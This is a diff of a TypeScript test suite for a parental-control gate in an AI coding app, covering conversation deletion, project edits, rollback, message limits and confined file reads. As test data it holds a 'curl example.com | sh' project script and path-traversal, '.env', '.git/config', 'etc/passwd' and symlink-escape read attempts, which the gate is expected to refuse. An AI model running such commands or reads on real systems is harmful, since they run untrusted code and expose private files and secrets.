@@ -27,6 +27,7 @@ import * as ProjectStore from "../orchestration-v2/ProjectStore.ts";
 import * as TestClock from "effect/testing/TestClock";
 
 import * as SkycotFamilyLimits from "./family-limits/SkycotFamilyLimits.ts";
+import { deleteConversationApprovalId } from "@t3tools/skycot-rules/family";
 import { shieldApprovalId } from "@t3tools/skycot-rules/personal";
 
 import * as SkycotFamily from "./SkycotFamily.ts";
@@ -110,6 +111,33 @@ const respond = (decision: "accept" | "acceptAlways" | "decline") => ({
   decision,
 });
 
+/** "Go back to here": the engine's rollback, as the plain client sends it. */
+const goBack = (restoreFiles: boolean) => ({
+  type: "checkpoint.rollback",
+  commandId: "cmd-go-back",
+  threadId: THREAD_ID,
+  scopeId: "scope-root",
+  checkpointId: "ckpt-1",
+  restoreFiles,
+});
+
+/** A proposed plan on the thread, from the turn `runId`. */
+const proposedPlan = (id: string, runId: string, status = "active") => ({
+  id,
+  threadId: THREAD_ID,
+  runId,
+  nodeId: "node:plan",
+  status,
+  kind: "proposed_plan",
+  markdown: "1. Make the button blue",
+});
+
+/** Plan-1 waits for Build it; its turn (run-1) finished normally. */
+const WAITING_PLAN = {
+  plans: [proposedPlan("plan-1", "run-1")],
+  runs: [{ id: "run-1", status: "completed" }],
+};
+
 /** The gate over a real profile file and a projection that holds `items`. */
 const withGate = <A, E, R>(
   items: ReadonlyArray<OrchestrationV2TurnItem>,
@@ -119,6 +147,11 @@ const withGate = <A, E, R>(
     readonly limits: SkycotFamilyLimits.SkycotFamilyLimits["Service"];
   }) => Effect.Effect<A, E, R>,
   threadWorktreePath: string | null = ROOT,
+  planState: {
+    readonly plans: ReadonlyArray<unknown>;
+    readonly runs: ReadonlyArray<unknown>;
+  } = WAITING_PLAN,
+  extraRoots: ReadonlyArray<string> = [],
 ) =>
   Effect.gen(function* () {
     const fs = yield* FileSystem.FileSystem;
@@ -130,6 +163,13 @@ const withGate = <A, E, R>(
         getThread: () => Effect.succeed({ ...thread, worktreePath: threadWorktreePath }),
         getTurnItem: ({ itemId }) =>
           Effect.succeed(items.find((item) => item.id === itemId) ?? null),
+        getThreadProjection: () => Effect.succeed(planState as never),
+        getThreadWorktreePaths: () =>
+          Effect.succeed(
+            threadWorktreePath === null
+              ? []
+              : [{ threadId: THREAD_ID, worktreePath: threadWorktreePath }],
+          ),
       }),
       Layer.mock(ProjectStore.ProjectStoreV2)({
         get: (projectId) =>
@@ -137,6 +177,10 @@ const withGate = <A, E, R>(
             projectId === thread.projectId
               ? Option.some({ id: projectId, workspaceRoot: ROOT } as never)
               : Option.none(),
+          ),
+        list: () =>
+          Effect.succeed(
+            [ROOT, ...extraRoots].map((workspaceRoot) => ({ workspaceRoot }) as never),
           ),
         findActiveByWorkspaceRoot: (root) =>
           Effect.succeed(
@@ -171,12 +215,25 @@ describe("gateNeedFor", () => {
       ["scheduledTasks.setEnabled", { enabled: false }],
       ["scheduledTasks.delete", {}],
       ["projects.mutate", { type: "project.update", title: "New name" }],
+      [
+        "projects.mutate",
+        {
+          type: "project.update",
+          commandId: "c",
+          projectId: "p",
+          projectIcon: { kind: "emoji", emoji: "🚀" },
+        },
+      ],
+      ["projects.mutate", { type: "project.update", projectIcon: null, title: undefined }],
       ["server.updateSettings", { patch: { defaultRuntimeMode: "approval-required" } }],
       [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, { type: "message.dispatch" }],
       [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, respond("decline")],
       [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, { type: "thread.create", worktreePath: null }],
       [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, { type: "thread.archive" }],
       [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, { type: "thread.unarchive" }],
+      // Going back to an earlier message, and Undo: the same rollback, with or without files.
+      [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, goBack(true)],
+      [ORCHESTRATION_V2_WS_METHODS.dispatchCommand, goBack(false)],
       [
         ORCHESTRATION_V2_WS_METHODS.dispatchCommand,
         { type: "thread.metadata.update", title: "Mia's game" },
@@ -205,6 +262,43 @@ describe("gateNeedFor", () => {
     assert.equal(purpose("scheduledTasks.setEnabled", { enabled: true }), "automation");
     assert.equal(purpose("projects.mutate", { type: "project.create" }), "openFolder");
     assert.equal(purpose("projects.mutate", { type: "project.delete" }), "openFolder");
+    assert.equal(
+      purpose("projects.mutate", { type: "project.update", workspaceRoot: "/Users/kid" }),
+      "openFolder",
+    );
+    // A project's scripts run commands; its other settings are the developer tools'.
+    for (const change of [
+      { scripts: [] },
+      { autoPull: true },
+      { defaultModelSelection: null },
+      { defaultThreadEnvMode: "worktree" },
+      { faviconPath: "/etc/hosts.png" },
+      { title: "Rocket", scripts: [] },
+      { workspaceRoot: "/Users/kid", scripts: [] },
+    ]) {
+      assert.equal(
+        purpose("projects.mutate", { type: "project.update", ...change }),
+        "advanced",
+        JSON.stringify(change),
+      );
+    }
+    // Deleting a conversation: a grown-up's yes for that one conversation, spent by the delete.
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor(ORCHESTRATION_V2_WS_METHODS.dispatchCommand, {
+        type: "thread.delete",
+        threadId: "thread:1",
+      }),
+      {
+        type: "grant",
+        purpose: "approve",
+        requestId: deleteConversationApprovalId("thread:1"),
+        consume: true,
+      },
+    );
+    assert.equal(
+      purpose(ORCHESTRATION_V2_WS_METHODS.dispatchCommand, { type: "thread.delete" }),
+      "advanced",
+    );
     assert.equal(purpose("terminal.open"), "advanced");
     assert.equal(purpose("provider.install.start"), "settings");
     assert.equal(
@@ -363,15 +457,9 @@ describe("gateNeedFor", () => {
       "subscribeAuthAccess",
       "subscribeBackgroundPolicy",
       "subscribeResourceTelemetry",
-      "projects.listEntries",
-      "projects.listIgnoredFiles",
-      "projects.readFile",
-      "projects.searchContents",
-      "projects.searchEntries",
       "projects.createNew",
       "projects.ensureScratch",
       "filesystem.getMetadata",
-      "assets.createUrl",
       "assets.persistChatAttachments",
       "attachments.createUploadUrl",
       "attachments.delete",
@@ -445,6 +533,13 @@ describe("gateNeedFor", () => {
       "secrets.answerRequest",
       "preview.open",
       "preview.navigate",
+      "projects.readFile",
+      "projects.listEntries",
+      "projects.listIgnoredFiles",
+      "projects.searchEntries",
+      "projects.searchContents",
+      "assets.createUrl",
+      "shell.openInEditor",
     ]);
     const undecided = [
       ...Object.values(WS_METHODS),
@@ -456,6 +551,67 @@ describe("gateNeedFor", () => {
         SkycotFamilyGate.gateNeedFor(method, {}) === null,
     );
     assert.deepEqual(undecided, []);
+  });
+});
+
+describe("gateNeedFor: reading files", () => {
+  it("judges stock file reads by the folder and path they name", () => {
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("projects.readFile", { cwd: ROOT, relativePath: "index.html" }),
+      { type: "readInProject", cwd: ROOT, path: "index.html" },
+    );
+    assert.deepEqual(SkycotFamilyGate.gateNeedFor("projects.readFile", {}), {
+      type: "grant",
+      purpose: "files",
+    });
+    assert.deepEqual(SkycotFamilyGate.gateNeedFor("projects.listEntries", { cwd: "/" }), {
+      type: "readInProject",
+      cwd: "/",
+    });
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("projects.listEntries", { cwd: ROOT, directoryPath: ".git" }),
+      { type: "readInProject", cwd: ROOT, path: ".git" },
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("projects.searchContents", { cwd: "/Users/kid" }),
+      { type: "readInProject", cwd: "/Users/kid" },
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("assets.createUrl", {
+        resource: { _tag: "media-file", threadId: "t", path: "/Users/kid/Pictures/me.jpg" },
+      }),
+      { type: "grant", purpose: "files" },
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("assets.createUrl", {
+        resource: { _tag: "draft-workspace-file", cwd: ROOT, path: "cat.png" },
+      }),
+      { type: "readInProject", cwd: ROOT, path: "cat.png" },
+    );
+    assert.isNull(
+      SkycotFamilyGate.gateNeedFor("assets.createUrl", {
+        resource: { _tag: "workspace-file", threadId: "t", path: "cat.png" },
+      }),
+    );
+  });
+
+  it("lets Show in Finder use the files yes, and keeps editors with the developer tools", () => {
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("shell.openInEditor", {
+        cwd: `${ROOT}/cat.png`,
+        editor: "file-manager",
+        reveal: true,
+      }),
+      { type: "grant", purpose: "files" },
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("shell.openInEditor", { cwd: ROOT, editor: "vscode" }),
+      { type: "grant", purpose: "advanced" },
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.gateNeedFor("shell.openInEditor", { cwd: ROOT, editor: "file-manager" }),
+      { type: "grant", purpose: "advanced" },
+    );
   });
 });
 
@@ -693,6 +849,107 @@ it.layer(NodeServices.layer)("SkycotFamilyGate.check", (it) => {
     ),
   );
 
+  // Deleting cannot be undone, so the plain client asks for the parent code for that one
+  // conversation; the yes is spent by the delete and opens nothing else.
+  it.effect("lets a child delete a conversation only with a grown-up's yes for that one", () =>
+    withGate([], ({ gate, family }) =>
+      Effect.gen(function* () {
+        const remove = (threadId: string, sessionId = SESSION) =>
+          gate.check({
+            sessionId,
+            method: ORCHESTRATION_V2_WS_METHODS.dispatchCommand,
+            payload: { type: "thread.delete", commandId: "cmd-1", threadId },
+          });
+        const yes = (threadId: string, sessionId = SESSION) =>
+          family.verify({
+            code: CODE,
+            purpose: "approve",
+            sessionId,
+            requestId: deleteConversationApprovalId(threadId),
+          });
+        // Off: nothing is gated.
+        assert.isFalse(yield* refused(remove(THREAD_ID)));
+        yield* family.enable({ code: CODE, childName: "Ava" });
+        const error = yield* Effect.flip(remove(THREAD_ID));
+        assert.equal(error.requiredPermission, SkycotFamilyGate.FAMILY_PERMISSION);
+        // A yes for another conversation, or on another device, does not reach this one.
+        yield* yes("thread:other");
+        assert.isTrue(yield* refused(remove(THREAD_ID)));
+        yield* yes(THREAD_ID, "session-2");
+        assert.isTrue(yield* refused(remove(THREAD_ID)));
+        // The yes for this conversation lets the delete through, once.
+        yield* yes(THREAD_ID);
+        // ...and opens nothing else: no terminal, and the child's turns stay a child's.
+        assert.isTrue(
+          yield* refused(gate.check({ sessionId: SESSION, method: "terminal.open", payload: {} })),
+        );
+        assert.isFalse(yield* refused(remove(THREAD_ID)));
+        assert.isTrue(yield* refused(remove(THREAD_ID)));
+        // A wrong code opens nothing.
+        assert.isTrue(
+          yield* refused(
+            family.verify({
+              code: "000000",
+              purpose: "approve",
+              sessionId: SESSION,
+              requestId: deleteConversationApprovalId(THREAD_ID),
+            }),
+          ),
+        );
+        assert.isTrue(yield* refused(remove(THREAD_ID)));
+        // A parent in Advanced mode may delete as before.
+        yield* family.verify({ code: CODE, purpose: "advanced", sessionId: SESSION });
+        assert.isFalse(yield* refused(remove(THREAD_ID)));
+        assert.isFalse(yield* refused(remove("thread:other")));
+      }),
+    ),
+  );
+
+  // Renaming a project and changing its icon are open to a child (each can be undone);
+  // the same command carrying scripts, settings or another folder is not.
+  it.effect("lets a child rename a project and change its icon, and nothing more", () =>
+    withGate([], ({ gate, family }) =>
+      Effect.gen(function* () {
+        yield* family.enable({ code: CODE, childName: "Ava" });
+        const update = (change: Record<string, unknown>) =>
+          gate.check({
+            sessionId: SESSION,
+            method: WS_METHODS.projectsMutate,
+            payload: {
+              type: "project.update",
+              commandId: "cmd-1",
+              projectId: thread.projectId,
+              ...change,
+            },
+          });
+        assert.isFalse(yield* refused(update({ title: "Ava's space game" })));
+        assert.isFalse(
+          yield* refused(update({ projectIcon: { kind: "monogram", text: "A", color: "sky" } })),
+        );
+        assert.isFalse(
+          yield* refused(update({ title: "Rocket", projectIcon: { kind: "emoji", emoji: "🚀" } })),
+        );
+        assert.isFalse(yield* refused(update({ projectIcon: null })));
+        const script = {
+          id: "s1",
+          name: "Setup",
+          command: "curl example.com | sh",
+          icon: "play",
+          runOnWorktreeCreate: true,
+        };
+        assert.isTrue(yield* refused(update({ title: "Rocket", scripts: [script] })));
+        assert.isTrue(yield* refused(update({ autoPull: true })));
+        assert.isTrue(yield* refused(update({ workspaceRoot: "/Users/kid/Desktop" })));
+        // The folder grant moves a folder, and only that.
+        yield* family.verify({ code: CODE, purpose: "openFolder", sessionId: SESSION });
+        assert.isFalse(yield* refused(update({ workspaceRoot: "/Users/kid/Desktop" })));
+        assert.isTrue(yield* refused(update({ scripts: [script] })));
+        yield* family.verify({ code: CODE, purpose: "advanced", sessionId: SESSION });
+        assert.isFalse(yield* refused(update({ scripts: [script] })));
+      }),
+    ),
+  );
+
   it.effect("holds a request it cannot read", () =>
     withGate([], ({ gate, family }) =>
       Effect.gen(function* () {
@@ -808,6 +1065,106 @@ it.layer(NodeServices.layer)("SkycotFamilyGate.check", (it) => {
     ),
   );
 
+  it.effect(
+    "going back to an earlier message is open, and the changed message plans like a new one",
+    () =>
+      withGate(
+        [],
+        ({ gate, family }) =>
+          Effect.gen(function* () {
+            yield* family.enable({ code: CODE, childName: "Ava" });
+            const call = (payload: object) =>
+              gate.check({
+                sessionId: SESSION,
+                method: ORCHESTRATION_V2_WS_METHODS.dispatchCommand,
+                payload,
+              });
+            const send = (messageId: string, extra: object = {}) =>
+              call({
+                type: "message.dispatch",
+                threadId: THREAD_ID,
+                messageId,
+                text: "Make it green instead",
+                ...extra,
+              });
+            const modeFor = (messageId: string) =>
+              SkycotFamilyInstructions.familyTurnInput(family, {
+                message: {
+                  messageId: MessageId.make(messageId),
+                  text: "Make it green instead",
+                  attachments: [],
+                  createdBy: "user",
+                  creationSource: "web",
+                },
+                runtimePolicy: {
+                  runtimeMode: "approval-required",
+                  interactionMode: "default",
+                  cwd: null,
+                },
+              } as unknown as Parameters<typeof SkycotFamilyInstructions.familyTurnInput>[1]).pipe(
+                Effect.map((input) => input.runtimePolicy.interactionMode),
+              );
+
+            // The child may go back, keeping the files or putting them back (it is Undo).
+            yield* call(goBack(false));
+            yield* call(goBack(true));
+            // The changed message is an ordinary message: it runs as a plan.
+            yield* send("message:changed");
+            assert.equal(yield* modeFor("message:changed"), "plan");
+            // A Build it of the plan that going back took away plans again: the assistant no
+            // longer has that plan, though the engine still lists it as waiting.
+            yield* send("message:build-taken-back", {
+              sourcePlanRef: { threadId: THREAD_ID, planId: "plan-taken-back" },
+            });
+            assert.equal(yield* modeFor("message:build-taken-back"), "plan");
+            // A plan made after going back builds as usual.
+            yield* send("message:build-new", {
+              sourcePlanRef: { threadId: THREAD_ID, planId: "plan-new" },
+            });
+            assert.equal(yield* modeFor("message:build-new"), "default");
+            // A plan the gate can't find plans too.
+            yield* send("message:build-unknown", {
+              sourcePlanRef: { threadId: THREAD_ID, planId: "plan-unknown" },
+            });
+            assert.equal(yield* modeFor("message:build-unknown"), "plan");
+          }),
+        ROOT,
+        {
+          plans: [proposedPlan("plan-taken-back", "run-2"), proposedPlan("plan-new", "run-3")],
+          runs: [
+            { id: "run-1", status: "completed" },
+            { id: "run-2", status: "rolled_back" },
+            { id: "run-3", status: "completed" },
+          ],
+        },
+      ),
+  );
+
+  it("a plan builds only while it waits and its turn still stands", () => {
+    const projection = (planStatus: string, runStatus: string) =>
+      ({
+        plans: [proposedPlan("plan-1", "run-1", planStatus)],
+        runs: [{ id: "run-1", status: runStatus }],
+      }) as never;
+    assert.isTrue(SkycotFamilyGate.planStillBuildable(projection("active", "completed"), "plan-1"));
+    assert.isFalse(
+      SkycotFamilyGate.planStillBuildable(projection("active", "rolled_back"), "plan-1"),
+    );
+    for (const status of ["completed", "superseded", "draft"]) {
+      assert.isFalse(
+        SkycotFamilyGate.planStillBuildable(projection(status, "completed"), "plan-1"),
+      );
+    }
+    assert.isFalse(
+      SkycotFamilyGate.planStillBuildable(projection("active", "completed"), "plan-2"),
+    );
+    assert.deepEqual(
+      SkycotFamilyGate.sourcePlanOf({ sourcePlanRef: { threadId: "t", planId: "p" } }),
+      { threadId: "t", planId: "p" },
+    );
+    assert.isNull(SkycotFamilyGate.sourcePlanOf({ sourcePlanRef: { planId: "p" } }));
+  });
+
   it.effect("a shield yes for one message does not reach another session's message", () =>
     withGate([], ({ gate, family }) =>
       Effect.gen(function* () {
@@ -839,6 +1196,87 @@ it.layer(NodeServices.layer)("SkycotFamilyGate.check", (it) => {
     ),
   );
 
+  it.effect("keeps a child's file reads inside SKYCOT's projects and private copies", () => {
+    const copy = "/Users/kid/.t3/worktrees/space-game-copy";
+    return withGate(
+      [],
+      ({ gate, family }) =>
+        Effect.gen(function* () {
+          const read = (payload: unknown, method = "projects.readFile") =>
+            refused(gate.check({ sessionId: SESSION, method, payload }));
+          // Off: nothing is gated.
+          assert.isFalse(yield* read({ cwd: "/", relativePath: "etc/passwd" }));
+          yield* family.enable({ code: CODE, childName: null });
+          assert.isFalse(yield* read({ cwd: ROOT, relativePath: "index.html" }));
+          assert.isFalse(yield* read({ cwd: `${ROOT}/pictures`, relativePath: "cat.png" }));
+          assert.isFalse(yield* read({ cwd: copy, relativePath: "rockets.html" }));
+          assert.isFalse(yield* read({ cwd: ROOT }, "projects.listEntries"));
+          for (const payload of [
+            { cwd: ROOT, relativePath: "/Users/kid/Documents/diary.txt" },
+            { cwd: ROOT, relativePath: "../../Documents/diary.txt" },
+            { cwd: ROOT, relativePath: "~/Documents/diary.txt" },
+            { cwd: ROOT, relativePath: ".env" },
+            { cwd: ROOT, relativePath: ".git/config" },
+            { cwd: "/Users/kid/Documents", relativePath: "diary.txt" },
+            { cwd: "/Users/kid/projects/space-game-secret", relativePath: "x.txt" },
+          ]) {
+            assert.isTrue(yield* read(payload), JSON.stringify(payload));
+          }
+          assert.isTrue(yield* read({ cwd: "/Users/kid" }, "projects.listEntries"));
+          assert.isTrue(yield* read({ cwd: "/", query: "diary" }, "projects.searchEntries"));
+          assert.isTrue(
+            yield* read(
+              { resource: { _tag: "media-file", threadId: THREAD_ID, path: "/Users/kid/me.jpg" } },
+              "assets.createUrl",
+            ),
+          );
+          const reveal = { cwd: `${ROOT}/cat.png`, editor: "file-manager", reveal: true };
+          assert.isTrue(yield* read(reveal, "shell.openInEditor"));
+
+          yield* family.verify({ code: CODE, purpose: "files", sessionId: SESSION });
+          assert.isFalse(yield* read({ cwd: ROOT, relativePath: ".env" }));
+          assert.isFalse(yield* read({ cwd: "/Users/kid/Documents", relativePath: "diary.txt" }));
+          assert.isFalse(yield* read(reveal, "shell.openInEditor"));
+          // An editor is still the developer tools'.
+          assert.isTrue(yield* read({ cwd: ROOT, editor: "vscode" }, "shell.openInEditor"));
+        }),
+      copy,
+    );
+  });
+
+  it.effect("judges a symlinked folder by where it really is", () =>
+    Effect.gen(function* () {
+      const fs = yield* FileSystem.FileSystem;
+      const path = yield* Path.Path;
+      const dir = yield* fs.makeTempDirectoryScoped({ prefix: "skycot-gate-links-" });
+      const project = path.join(dir, "pets");
+      const outside = path.join(dir, "documents");
+      yield* fs.makeDirectory(path.join(project, "pictures"), { recursive: true });
+      yield* fs.makeDirectory(outside, { recursive: true });
+      yield* fs.symlink(outside, path.join(project, "sneaky"));
+      yield* withGate(
+        [],
+        ({ gate, family }) =>
+          Effect.gen(function* () {
+            yield* family.enable({ code: CODE, childName: null });
+            const list = (cwd: string) =>
+              refused(
+                gate.check({
+                  sessionId: SESSION,
+                  method: "projects.listEntries",
+                  payload: { cwd },
+                }),
+              );
+            assert.isFalse(yield* list(path.join(project, "pictures")));
+            assert.isTrue(yield* list(path.join(project, "sneaky")));
+          }),
+        null,
+        WAITING_PLAN,
+        [project],
+      );
+    }).pipe(Effect.scoped),
+  );
+
   it.effect("wraps the scope middleware: a refused call never reaches it", () =>
     withGate([], ({ gate, family }) =>
       Effect.gen(function* () {
@@ -864,7 +1302,7 @@ it.layer(NodeServices.layer)("SkycotFamilyGate.check", (it) => {
           );
         assert.isTrue(Exit.isFailure(yield* call("terminal.open")));
         assert.equal(scopeChecks, 0);
-        assert.isTrue(Exit.isSuccess(yield* call("projects.readFile")));
+        assert.isTrue(Exit.isSuccess(yield* call("projects.list")));
         assert.equal(scopeChecks, 1);
       }),
     ),
@@ -954,6 +1392,39 @@ it.layer(NodeServices.layer)("SkycotFamilyGate limits", (it) => {
           assert.include(error.message, "7:00 am");
           yield* at("2026-10-23T07:00:00+11:00");
           yield* gate.check({ sessionId: SESSION, ...message() });
+        }),
+      ),
+  );
+
+  it.effect(
+    "going back is not a message; the changed message counts and sleeps like any other",
+    () =>
+      withGate([], ({ gate, family, limits }) =>
+        Effect.gen(function* () {
+          yield* setUp(family);
+          const goBackCall = {
+            sessionId: SESSION,
+            method: ORCHESTRATION_V2_WS_METHODS.dispatchCommand,
+            payload: goBack(true),
+          };
+          yield* at("2026-10-22T09:00:00+11:00");
+          yield* gate.check(goBackCall);
+          yield* gate.check({ ...goBackCall, payload: goBack(false) });
+          assert.equal((yield* limits.forSession({ sessionId: SESSION })).limits?.turns, 0);
+          // The changed message is the day's first message.
+          yield* gate.check({ sessionId: SESSION, ...message() });
+          assert.equal((yield* limits.forSession({ sessionId: SESSION })).limits?.turns, 1);
+          yield* gate.check({ sessionId: SESSION, ...message() });
+          yield* gate.check({ sessionId: SESSION, ...message() });
+          // At the day's cap, going back still works (like Undo); the changed message waits.
+          yield* gate.check(goBackCall);
+          const capped = yield* Effect.flip(gate.check({ sessionId: SESSION, ...message() }));
+          assert.include(capped.message, "today's 3 messages");
+          // At bedtime too.
+          yield* at("2026-10-22T20:00:00+11:00");
+          yield* gate.check(goBackCall);
+          const asleep = yield* Effect.flip(gate.check({ sessionId: SESSION, ...message() }));
+          assert.equal(asleep.requiredPermission, SkycotFamilyGate.FAMILY_ASLEEP_PERMISSION);
         }),
       ),
   );
